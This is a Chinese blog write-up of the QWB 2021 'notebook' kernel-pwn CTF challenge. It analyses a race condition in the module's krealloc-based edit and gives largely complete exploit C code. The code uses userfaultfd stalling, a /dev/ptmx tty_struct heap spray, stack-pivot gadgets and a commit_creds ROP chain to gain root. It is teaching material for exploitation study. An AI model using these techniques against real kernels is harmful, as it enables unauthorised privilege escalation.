---
title: Kernel pwn 入门 (6)
date: 2023-02-28 22:32:20
categories:
- 学习笔记
- kernel pwn 系列
---
本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。

# 强网杯2021-notebook

这是一道kernel pwn题。我们首先打开ko文件看看。
本文主要参考资料：[资料](https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd)

# Step 1: 查看file_operations结构体
![](1.png)
找到file_operations结构体，其中定义了write函数和ioctl函数的地址。但这里实际上还隐含着定义了read函数。因为read函数在模块中的偏移为0，因此可以认为结构体中所有为0的字段都指向read函数。不过我们这里因为用不到其他函数，因此认为read函数也被定义了。

# Step 2: 分析write函数
![](2.png)
write函数就是一个普通的写入，从用户内存读取，其中第三个参数index不能大于0x10，复制的size由notebook中的size决定。

# Step 3: 分析ioctl函数
![](3.png)
ioctl函数一共有4种有效指令码，分别对应add、gift、del、edit四个函数。接下来分别进行分析。

# Step 4: 分析noteadd函数
![](4.png)
添加函数中每一个note的大小不能超过0x60，传入的第三个参数将被拷贝到name中。

# Step 5: 分析notegift函数
![](5.png)
这个函数是直接将notebook这个数组输出出来了，我们能够实时获取到notebook中所有指针和size的信息。看上去是一个比较有用的函数。

# Step 6: 分析notedel函数
![](6.png)
删除函数中规中矩，就是一个删除功能，不留悬挂指针。
# Step 7: 分析noteedit函数
![](7.png)
这个函数会修改内存块的大小，使用krealloc函数对齐重新分配空间，而且只有在确认重新分配的空间有效的情况下才会修改notebook数组中的元素。当传入的newsize为0时，会被当做free处理释放空间，同时移出指针和size。

# Step 8: 分析read函数
![](8.png)
read函数也很普通，就是一个将notebook内存块中的内容读出的函数。

# Step 9: 查看run.sh和init脚本
本题的run.sh中，我们发现打开了kaslr、SMP保护。
本题的init文件中，有一些值得关注的地方：
![](9.png)
脚本中将/proc/modules中的notebook文件移动到了/tmp中，我们能够通过/tmp/moduleaddr这个文件获取到notebook这个模块在内核中的加载地址。这便于我们调试，同时也可能为后面的漏洞利用提供条件。

```
/ $ cat /tmp/moduleaddr 
notebook 16384 0 - Live 0xffffffffc03ae000 (O)
```

# Step 10: 漏洞分析
注意noteedit函数，其中并没有对新分配的内存大小进行限制，也就是说我们可以绕过noteadd中申请大小最大只能为0x60的限制。

然后再看一下各个函数的加锁情况。noteadd、noteedit函数加了读锁，notedel函数加了写锁。这里存在条件竞争漏洞：noteedit使用的是krealloc函数重新分配内存。当重新分配的大小大于原来的大小时会将原来的内存空间释放，并且noteedit函数中**notebook相应指针的修改发生在krealloc之后**。如果在当前线程的noteedit还没有修改notebook时将这块内存重新分配，并在另一个线程中写入，就会造成条件竞争漏洞。但在当前线程一直在执行的情况下，krealloc和修改指针的操作相隔时间极短，在这段时间内重新分配到这块空间并修改难度极大。因此**本题使用一种称为userfaultfd**的利用方式来解决这个问题。

> （摘自[资料](https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd)）userfaultfd 本身只是一个常规的与处理缺页异常相关的系统调用，但是通过这个机制我们可以控制进程执行流程的先后顺序，从而使得对条件竞争的利用成功率大幅提高。

在Linux 5.4版本及以下内核中，这种利用方式都是可行的，往上的版本中内核规定只有root才有权限执行此类操作。不过我们通过uname -a命令查看到本题的linux版本是4.15.8，可以使用这种方式进行利用。

这种利用方式在原理上较为复杂，但是有现成的调用函数可用，只要传入适当的参数就能够设定在缺页异常时执行某个函数。具体的原理在[这篇文章](https://blog.csdn.net/maybeYoc/article/details/123456398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165899942316782184627366%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165899942316782184627366&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-123456398-null-null.142^v35^control&utm_term=userfaultfd&spm=1018.2226.3001.4187)中有详细的解释，感兴趣的读者可以了解一下，不过不看也没关系，我们使用固定的函数模板即可。（以下代码摘自[资料](https://blog.arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd)）

```c
static pthread_t monitor_thread;

void errExit(char * msg)
{
    printf("[x] Error at: %s\n", msg);
    exit(EXIT_FAILURE);
}

/**
 * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler
 */
void registerUserFaultFd(void * addr, unsigned long len, void (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}
```

```c
static char *page = NULL;
static long page_size;

static void *
fault_handler_thread(void *arg)	// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中
{
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;) 
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        /*
         * [在这停顿.jpg]
         * 当 poll 返回时说明出现了缺页异常
         * 你可以在这里插入一些比如说 sleep() 一类的操作
         */

        if (nready == -1)
            errExit("poll");

        nread = read(uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
            errExit("Unexpected event on userfaultfd\n");

        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                                              ~(page_size - 1);
        uffdio_copy.len = page_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
            errExit("ioctl-UFFDIO_COPY");
    }
}
```

那么我们应该如何触发缺页异常呢？很简单，我们只需要在noteedit函数中传入mmap出来空间的地址即可。那么有的读者就要问了，mmap出来的空间不是已经被映射了吗，krealloc之后的copy_from_user函数拷贝的大小是0x100远小于0x1000，为什么还会缺页呢？我们直接访问试试。写一条语句直接向这块空间写入一个字节，最后居然是segmentation fault，段错误。这是怎么回事？我们不是通过mmap已经分配了这个空间了吗？
![](10.png)
![](11.png)
通过内核调试，我们发现，内核确实无法访问这块mmap出来的空间，即使是vmmap也没有显示这块空间。

找了很长时间的资料，最终在[这篇文章](https://blog.csdn.net/21cnbao/article/details/108480659?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165908725716782388037719%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165908725716782388037719&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-108480659-null-null.142^v35^control&utm_term=%E4%BD%BF%E7%94%A8mmap%E5%8F%91%E7%94%9F%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B8&spm=1018.2226.3001.4187)中发现了一丝端倪：

> 当我们应用程序使用ｍｍap来创建匿名的内存映射的时候，页同样只是分配了虚拟内存，并没有分配物理内存，第一次去访问的时候才会通过触发缺页异常来分配物理页建立和虚拟页的映射关系。

即这块内存并没有物理内存与之对应，因此会触发缺页异常。

我们事先对这块mmap出来的空间注册userfaultfd函数，那么缺页异常发生时就会执行这个函数了，在函数中我们可以以各种方式阻塞该线程的执行，最为简单的就是调用sleep函数睡一段时间，然后另外一个线程趁此机会进行其他的恶意操作（指重复打开/dev/ptmx文件使原note空间有可能被分配为tty_struct结构体，然后write函数调用进行修改）。

下面是打开/dev/ptmx时执行的一个关键函数：
```c
static void __init unix98_pty_init(void)
{
	ptm_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,
			TTY_DRIVER_RESET_TERMIOS |
			TTY_DRIVER_REAL_RAW |
			TTY_DRIVER_DYNAMIC_DEV |
			TTY_DRIVER_DEVPTS_MEM |
			TTY_DRIVER_DYNAMIC_ALLOC);
	if (IS_ERR(ptm_driver))
		panic("Couldn't allocate Unix98 ptm driver");
	pts_driver = tty_alloc_driver(NR_UNIX98_PTY_MAX,
			TTY_DRIVER_RESET_TERMIOS |
			TTY_DRIVER_REAL_RAW |
			TTY_DRIVER_DYNAMIC_DEV |
			TTY_DRIVER_DEVPTS_MEM |
			TTY_DRIVER_DYNAMIC_ALLOC);
	if (IS_ERR(pts_driver))
		panic("Couldn't allocate Unix98 pts driver");

	ptm_driver->driver_name = "pty_master";
	ptm_driver->name = "ptm";
	ptm_driver->major = UNIX98_PTY_MASTER_MAJOR;
	ptm_driver->minor_start = 0;
	ptm_driver->type = TTY_DRIVER_TYPE_PTY;
	ptm_driver->subtype = PTY_TYPE_MASTER;
	ptm_driver->init_termios = tty_std_termios;
	ptm_driver->init_termios.c_iflag = 0;
	ptm_driver->init_termios.c_oflag = 0;
	ptm_driver->init_termios.c_cflag = B38400 | CS8 | CREAD;
	ptm_driver->init_termios.c_lflag = 0;
	ptm_driver->init_termios.c_ispeed = 38400;
	ptm_driver->init_termios.c_ospeed = 38400;
	ptm_driver->other = pts_driver;
	tty_set_operations(ptm_driver, &ptm_unix98_ops);

	pts_driver->driver_name = "pty_slave";
	pts_driver->name = "pts";
	pts_driver->major = UNIX98_PTY_SLAVE_MAJOR;
	pts_driver->minor_start = 0;
	pts_driver->type = TTY_DRIVER_TYPE_PTY;
	pts_driver->subtype = PTY_TYPE_SLAVE;
	pts_driver->init_termios = tty_std_termios;
	pts_driver->init_termios.c_cflag = B38400 | CS8 | CREAD;
	pts_driver->init_termios.c_ispeed = 38400;
	pts_driver->init_termios.c_ospeed = 38400;
	pts_driver->other = ptm_driver;
	tty_set_operations(pts_driver, &pty_unix98_ops);

	if (tty_register_driver(ptm_driver))
		panic("Couldn't register Unix98 ptm driver");
	if (tty_register_driver(pts_driver))
		panic("Couldn't register Unix98 pts driver");

	/* Now create the /dev/ptmx special device */
	tty_default_fops(&ptmx_fops);
	ptmx_fops.open = ptmx_open;

	cdev_init(&ptmx_cdev, &ptmx_fops);
	if (cdev_add(&ptmx_cdev, MKDEV(TTYAUX_MAJOR, 2), 1) ||
	    register_chrdev_region(MKDEV(TTYAUX_MAJOR, 2), 1, "/dev/ptmx") < 0)
		panic("Couldn't register /dev/ptmx driver");
	device_create(tty_class, NULL, MKDEV(TTYAUX_MAJOR, 2), NULL, "ptmx");
}
```

注意到其中一共通过tty_alloc_driver函数分配了两个tty_operations结构体，这两个结构体的tty_operations被分别赋值为ptm_unix98_ops和pty_unix98_ops。这两个是静态常量，因此可以在vmlinux的符号表中找到，其地址与基址的差值固定：

```c
static const struct tty_operations ptm_unix98_ops = {
	.lookup = ptm_unix98_lookup,
	.install = pty_unix98_install,
	.remove = pty_unix98_remove,
	.open = pty_open,
	.close = pty_close,
	.write = pty_write,
	.write_room = pty_write_room,
	.flush_buffer = pty_flush_buffer,
	.chars_in_buffer = pty_chars_in_buffer,
	.unthrottle = pty_unthrottle,
	.ioctl = pty_unix98_ioctl,
	.compat_ioctl = pty_unix98_compat_ioctl,
	.resize = pty_resize,
	.cleanup = pty_cleanup,
	.show_fdinfo = pty_show_fdinfo,
};

static const struct tty_operations pty_unix98_ops = {
	.lookup = pts_unix98_lookup,
	.install = pty_unix98_install,
	.remove = pty_unix98_remove,
	.open = pty_open,
	.close = pty_close,
	.write = pty_write,
	.write_room = pty_write_room,
	.flush_buffer = pty_flush_buffer,
	.chars_in_buffer = pty_chars_in_buffer,
	.unthrottle = pty_unthrottle,
	.set_termios = pty_set_termios,
	.start = pty_start,
	.stop = pty_stop,
	.cleanup = pty_cleanup,
};
```

在一个线程被阻塞时，我们可以通过read函数读取到tty_operations的地址值，通过最后12比特来确认这里的值是pty_unix98_ops还是ptm_unix98_ops。

**注意：tty_alloc_driver函数实际上调用的是__tty_alloc_driver这个函数，其中将tty_struct的magic字段赋值为TTY_DRIVER_MAGIC，值为0x5402（4.15.8版本内核，不同版本的值可能不同）。因此可以通过读取magic值判断这块内存是否被分配为tty_struct结构体。**

我们将tty_operations改为我们构造好的结构，但本题开启了SMP保护，不能直接写一个用户空间的内存地址。考虑到notegift函数能够为我们返回所有note的地址，因此可以考虑将tty_operations写在note里面。

# Step 11 exp编写——写好交互
实现接口与提示性输出。
uffdexploit.c:
```c
//
// Created by root on 22-7-28.
//
#include <sys/types.h>
#include <stdio.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#ifndef ROOTFS_UFFDEXPLOIT_H
#define ROOTFS_UFFDEXPLOIT_H
static pthread_t monitor_thread;
size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("\033[34m\033[1m[*] Status has been saved.\n\033[0m");
}

void errExit(char * msg)
{
    printf("\033[1;31m[x] Error: %s\n\033[m", msg);
    exit(EXIT_FAILURE);
}

/**
 * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler
 */
void registerUserFaultFd(void * addr, unsigned long len, void* (*handler)(void*))
{
    long uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    int s;

    /* Create and enable userfaultfd object */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd == -1)
        errExit("userfaultfd");

    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    if (ioctl((int)uffd, UFFDIO_API, &uffdio_api) == -1)
        errExit("ioctl-UFFDIO_API");

    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl((int)uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
        errExit("ioctl-UFFDIO_REGISTER");

    s = pthread_create(&monitor_thread, NULL, handler, (void *) uffd);
    if (s != 0)
        errExit("pthread_create");
}

// this is a universal function to print binary data from a char* array
void print_binary(char* buf, int length){
    printf("---------------------------------------------------------------------------\n");
    printf("Address info starting in %p:\n", buf);
    int index = 0;
    char output_buffer[80];
    memset(output_buffer, '\0', 80);
    memset(output_buffer, ' ', 0x10);
    for(int i=0; i<(length % 16 == 0 ? length / 16 : length / 16 + 1); i++){
        char temp_buffer[0x10];
        memset(temp_buffer, '\0', 0x10);
        sprintf(temp_buffer, "%#5x", index);
        strcpy(output_buffer, temp_buffer);
        output_buffer[5] = ' ';
        output_buffer[6] = '|';
        output_buffer[7] = ' ';
        for(int j=0; j<16; j++){
            if(index+j >= length)
                sprintf(output_buffer+8+3*j, "   ");
            else{
                sprintf(output_buffer+8+3*j, "%02x ", ((int)buf[index+j]) & 0xFF);
                if(!isprint(buf[index+j]))
                    output_buffer[58+j] = '.';
                else
                    output_buffer[58+j] = buf[index+j];
            }
        }
        output_buffer[55] = ' ';
        output_buffer[56] = '|';
        output_buffer[57] = ' ';
        printf("%s\n", output_buffer);
        memset(output_buffer+58, '\0', 16);
        index += 16;
    }
    printf("---------------------------------------------------------------------------\n");
}
#endif //ROOTFS_UFFDEXPLOIT_H
```
exp.c（不完整）:
```c
//
// Created by root on 22-7-28.
//
#include <poll.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

#include "uffdexploit.h"

#define ADD_CODE 256
#define GIFT_CODE 100
#define DELETE_CODE 512
#define EDIT_CODE 768

int fd = 0;

typedef struct notearg{
    size_t idx;
    size_t size;
    void* buf;
}notearg;

void noteadd(size_t idx, size_t size, void* buf);
void notegift(void* buf);
void notedel(size_t idx);
void noteedit(size_t idx, size_t size, void* buf);
void notewrite(const char* buf, size_t idx);
void notebook_msg();

void noteadd(size_t idx, size_t size, void* buf){
    printf("\033[1;34mAdd note #%zu...\n\033[m", idx);
    notearg arg = {idx, size, buf};
    if(size <= 0x60)
        ioctl(fd, ADD_CODE, &arg);
    else{
        printf("\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m");
        arg.size = 0x60;
        ioctl(fd, ADD_CODE, &arg);
        arg.size = size;
        noteedit(idx, size, buf);
    }
}
void notegift(void* buf){
    printf("\033[1;32mFetch note information...\n\033[m");
    notearg arg = {0, 0, buf};
    ioctl(fd, GIFT_CODE, &arg);
}
void notedel(size_t idx){
    printf("\033[1;34mDelete note #%zu...\n\033[m", idx);
    notearg arg = {idx, 0, NULL};
    ioctl(fd, DELETE_CODE, &arg);
}
void noteedit(size_t idx, size_t size, void* buf){
    printf("\033[1;34mResize note #%zu to %zu...\n\033[m", idx, size);
    notearg arg = {idx, size, buf};
    ioctl(fd, EDIT_CODE, &arg);
}
void notewrite(const char* buf, size_t idx){
    printf("\033[1;34mWrite to note #%zu...\n\033[m", idx);
    write(fd, buf, idx);
}
void notebook_msg(){
    size_t noteBuf[0x20] = {0};
    notegift(noteBuf);
    printf("\033[1;36m--------------------------------------------------------------------------------\n");
    printf("Current Notebook Info:\n");
    for(int i=0; i<0x10; i++)
        printf("\tNote #%2d: size = %zu, pointer = %p\n", i, noteBuf[i*2+1], (char*)noteBuf[i*2]);
    printf("--------------------------------------------------------------------------------\n\033[m");
}

int main(){
    fd = open("/dev/notebook", O_RDWR);
}
```

# Step 12: exp编写——使userfaultfd成功阻塞主线程
编译测试的时候别忘了加上-lpthread选项。
```c
int main(){
    saveStatus();
    page_size = sysconf(_SC_PAGESIZE);
    page = (char*)malloc(0x1000);
    memset(page, 'a', 0x1000);
    fd = open("/dev/notebook", O_RDWR);

    char* mmap_space = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("\033[1;34mMmap executed, mmap address: %p\n\033[m", mmap_space);
    registerUserFaultFd(mmap_space, 0x1000, fault_handler_thread);
    printf("\033[1;34mMmap space userfaultfd registered.\n\033[m");

    for(int i=0; i<0x10; i++)
        noteadd(i, TTY_STRUCT_SIZE, page);
    printf("\033[1;34mNotebook filled.\n\033[m");
    notebook_msg();

    noteedit(0, 0x2000, mmap_space);        // trigger page fault
}
```
其中最后一条语句就能够触发缺页异常。
![](12.png)
可以看到确实成功了。

# Step 13: exp编写——另开线程进行恶意写入
需要注意的是，在read和write函数均有_check_object_size函数调用，用于检查内存块的大小。这里是为了检查note的真实大小是否等于size。为了绕过这个检查，我们除了需要使用noteedit函数外，还需要使用noteadd函数将size改小一些。

修改之前：
![](13.png)
修改之后：
![](14.png)
# Step 14: exp编写——重复打开/dev/ptmx，获取tty_struct地址
在我们阻塞了一些线程之后，打开/dev/ptmx文件，tty_struct就有可能分配到note的地址中：

```c
    for(int i=0; i<0x60; i++)
        ptmx_fds[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    printf("\033[1;32mHeap sprayed by lots of tty_struct by opening /dev/ptmx\n\033[m");
    sleep(1);

    for(int i=0; i<0x10; i++)
        pthread_create(&add_thread, NULL, noteadd_exp, (void*)i);
    notebook_msg(true);
    sleep(1);

//    for(int i=0; i<0x10; i++)
//        sem_post(&add_sem);
//    sleep(1);

    char ttyinfo[0x300];
    memset(ttyinfo, 0, 0x300);
    char* hit_address = NULL;
    int hit_idx = -1;
    char* fake_ttyops_address = NULL;
    int fake_ttyops_idx = -1;
    size_t* fake_stack_address = NULL;
    int fake_stack_idx = -1;
    for(int i=0; i<0x10; i++){
        read(fd, ttyinfo, i);
        int header = *((int*)ttyinfo);
        if(header == 0x5401 || header ==  0x5402){
            hit_address = notebook_msg(false)[i].note;
            hit_idx = i;
        }else{
            if(fake_ttyops_idx == -1){
                fake_ttyops_address = (char*)(notebook_msg(false)[i].note);
                fake_ttyops_idx = i;
            }
            else{
                fake_stack_address = (size_t*)(notebook_msg(false)[i].note);
                fake_stack_idx = i;
            }
        }
        if(hit_address && fake_stack_address)
            break;
    }
```
这里重复打开之后，遍历所有的note，检查其magic魔数以判断是否是tty_struct结构体。对于不是tty_struct结构体的note，我们选择两个出来作为假的tty_operations和假的栈空间，准备用于栈迁移。

# Step 15: exp编写——构造ROP链
在调用/dev/ptmx的write函数时，rdi指向tty_struct结构体本身，因此可以利用这种性质获取到tty_struct结构体的地址，并将rsp赋值为这个地址。我们需要找的是能够将rdi中的内容拷贝到rsp中的gadget。正好有这个gadget：

```
root@ubuntu:~/Desktop/pwnfile/QWB/QWB-2021/notebook/附件# cat gadgets.txt | grep 'push rdi ; pop rsp'
0xffffffff812351be : push rdi ; pop rsp ; jmp 0xffffffff8123519f
0xffffffff81238d50 : push rdi ; pop rsp ; pop rbp ; add rax, rdx ; ret
0xffffffff8143f4e1 : push rdi ; pop rsp ; pop rbp ; or eax, edx ; ret
```

这样我们就可以第一次栈迁移到tty_struct。

然后，我们在tty_struct中再构造一个简短的gadget。因为tty_struct对于/dev/ptmx文件操作至关重要，对于其中的字段我们能修改地越少越好。因此我们还需要第二次栈迁移。这第二次栈迁移我们选择迁移到假的tty_operations中，这个tty_operations也就是进行第一次栈迁移时使用的假的tty_operations，其中写有构造好的write函数，也就是用于第一次栈迁移到tty_struct的gadget。

这里我们使用下面的gadget来进行构造：

```
0xffffffff81002141 : pop rbx ; pop rbp ; ret
0xffffffff8107875c : mov rsp, rbp ; pop rbp ; ret
```

我们在tty_struct[1]的位置写入第一个gadget，这样可以将假tty_operations（位于tty_struct[3]）地址拷贝到rbp中，然后在tty_struct[4]写入第二个gadget栈迁移到假tty_operations中。

由于tty_operations中需要有write函数指针指向第一次栈迁移gadget，为了避免覆盖，我们进行第三次栈迁移（或者使用诸如``add rsp, 0x10``这样的指令跳过）。

然后在第三次栈迁移后，我们终于可以相对自由地构造自己的rop链了。接下来就是常规的构造内核rop链过程：执行commit_creds(prepare_kernel_cred(NULL))、返回到用户态。注意这里含的``mov rdi, rax``的gadget不好找，在ROPgadget中没有这种gadget，但是通过objdump还是可以找到：

```asm
ffffffff81045833:	48 89 c7             	mov    %rax,%rdi
ffffffff81045836:	31 c0                	xor    %eax,%eax
ffffffff81045838:	48 81 ff 00 00 00 09 	cmp    $0x9000000,%rdi
ffffffff8104583f:	74 02                	je     ffffffff81045843 <lmce_supported+0x33>
ffffffff81045841:	5d                   	pop    %rbp
ffffffff81045842:	c3                   	retq
```
另外在swapgs_restore_regs_and_return_to_usermode函数中，前面的一大堆pop我们不需要，因此可以直接跳过。

![](15.png)

![](16.png)

exp:
```c
//
// Created by root on 22-7-28.
//
#include <poll.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>

struct tty_driver;
struct file;
struct ktermios;
struct termiox;
struct serial_icounter_struct;
struct seq_file;
struct tty_struct;

struct tty_operations {
    struct tty_struct * (*lookup)(struct tty_driver *driver,
                                  struct file *filp, int idx);
    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
    int  (*open)(struct tty_struct * tty, struct file * filp);
    void (*close)(struct tty_struct * tty, struct file * filp);
    void (*shutdown)(struct tty_struct *tty);
    void (*cleanup)(struct tty_struct *tty);
    int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
    void (*flush_chars)(struct tty_struct *tty);
    int  (*write_room)(struct tty_struct *tty);
    int  (*chars_in_buffer)(struct tty_struct *tty);
    int  (*ioctl)(struct tty_struct *tty,
                  unsigned int cmd, unsigned long arg);
    long (*compat_ioctl)(struct tty_struct *tty,
                         unsigned int cmd, unsigned long arg);
    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
    void (*throttle)(struct tty_struct * tty);
    void (*unthrottle)(struct tty_struct * tty);
    void (*stop)(struct tty_struct *tty);
    void (*start)(struct tty_struct *tty);
    void (*hangup)(struct tty_struct *tty);
    int (*break_ctl)(struct tty_struct *tty, int state);
    void (*flush_buffer)(struct tty_struct *tty);
    void (*set_ldisc)(struct tty_struct *tty);
    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
    void (*send_xchar)(struct tty_struct *tty, char ch);
    int (*tiocmget)(struct tty_struct *tty);
    int (*tiocmset)(struct tty_struct *tty,
                    unsigned int set, unsigned int clear);
    int (*resize)(struct tty_struct *tty, struct winsize *ws);
    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
    int (*get_icount)(struct tty_struct *tty,
                      struct serial_icounter_struct *icount);
    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
#ifdef CONFIG_CONSOLE_POLL
    int (*poll_init)(struct tty_driver *driver, int line, char *options);
	int (*poll_get_char)(struct tty_driver *driver, int line);
	void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
#endif
    const struct file_operations *proc_fops;
};

#define ADD_CODE 256
#define GIFT_CODE 100
#define DELETE_CODE 512
#define EDIT_CODE 768
#define TTY_STRUCT_SIZE 0x2E0

#define ptm_unix98_ops 0xFFFFFFFF81E8E440
#define pty_unix98_ops 0xFFFFFFFF81E8E320
#define commit_creds_BASE 0xFFFFFFFF810A9B40
#define prepare_kernel_cred_BASE 0xFFFFFFFF810A9EF0
#define kernel_BASE 0xFFFFFFFF81000000
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xFFFFFFFF81A00929

int fd = 0;
static char *page = NULL;
static long page_size;
static pthread_t add_thread, edit_thread;
char* mmap_space;
sem_t add_sem, edit_sem;
int ptmx_fds[0x60];
extern size_t user_cs, user_ss, user_rflags, user_sp;

typedef struct notearg{
    size_t idx;
    size_t size;
    void* buf;
}notearg;
typedef struct note{
    char* note;
    size_t size;
}note;

void noteadd(size_t idx, size_t size, void* buf);
void notegift(void* buf);
void notedel(size_t idx);
void noteedit(size_t idx, size_t size, void* buf);
void notewrite(const char* buf, size_t idx);
note* notebook_msg(bool printInfo);

void* noteedit_exp(void* args);
void* noteadd_exp(void* args);

void saveStatus();
void errExit(char* msg);
void registerUserFaultFd(void * addr, unsigned long len, void* (*handler)(void*));
void print_binary(char* buf, int length);
static void* fault_handler_thread(void *arg);
void getShell();

void noteadd(size_t idx, size_t size, void* buf){
    printf("\033[1;34mAdd note #%zu...\n\033[m", idx);
    notearg arg = {idx, size, buf};
    if(size <= 0x60)
        ioctl(fd, ADD_CODE, &arg);
    else{
        printf("\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m");
        arg.size = 0x60;
        ioctl(fd, ADD_CODE, &arg);
        arg.size = size;
        noteedit(idx, size, buf);
    }
}
void notegift(void* buf){
    printf("\033[1;32mFetch note information...\n\033[m");
    notearg arg = {0, 0, buf};
    ioctl(fd, GIFT_CODE, &arg);
}
void notedel(size_t idx){
    printf("\033[1;34mDelete note #%zu...\n\033[m", idx);
    notearg arg = {idx, 0, NULL};
    ioctl(fd, DELETE_CODE, &arg);
}
void noteedit(size_t idx, size_t size, void* buf){
    printf("\033[1;34mResize note #%zu to %zu...\n\033[m", idx, size);
    notearg arg = {idx, size, buf};
    ioctl(fd, EDIT_CODE, &arg);
}
void notewrite(const char* buf, size_t idx){
    printf("\033[1;34mWrite to note #%zu...\n\033[m", idx);
    write(fd, buf, idx);
}
note* notebook_msg(bool printInfo){
    note* noteBuf = malloc(sizeof(note) * 0x10);
    notegift(noteBuf);
    if(printInfo){
        printf("\033[1;36m--------------------------------------------------------------------------------\n");
        printf("Current Notebook Info:\n");
        for(int i=0; i<0x10; i++)
            printf("\tNote #%02d: size = %#zx, pointer = %p\n", i, noteBuf[i].size, noteBuf[i].note);
        printf("--------------------------------------------------------------------------------\n\033[m");
    }
    return noteBuf;
}
void* noteedit_exp(void* args){
    noteedit((int)args, 0x2000, mmap_space);
    return NULL;
}
void* noteadd_exp(void* args){
    noteadd((int)args, 0x50, mmap_space);
    return NULL;
}
static void* fault_handler_thread(void *arg)	// 这个arg参数对应上面registerUserFaultFd中pthread_create的第四个参数，将uffd文件描述符传入本函数中
{
    static struct uffd_msg msg;
    static int fault_cnt = 0;
    long uffd;

    struct uffdio_copy uffdio_copy;
    ssize_t nread;

    uffd = (long) arg;

    for (;;)
    {
        struct pollfd pollfd;
        int nready;
        pollfd.fd = (int)uffd;
        pollfd.events = POLLIN;
        nready = poll(&pollfd, 1, -1);

        printf("\033[1;32mSuccessfully entered registered userfaultfd!\n\033[m");
        sleep(50);      // stop here

        if (nready == -1)
            errExit("poll");

        nread = read((int)uffd, &msg, sizeof(msg));

        if (nread == 0)
            errExit("EOF on userfaultfd!\n");

        if (nread == -1)
            errExit("read");

        if (msg.event != UFFD_EVENT_PAGEFAULT)
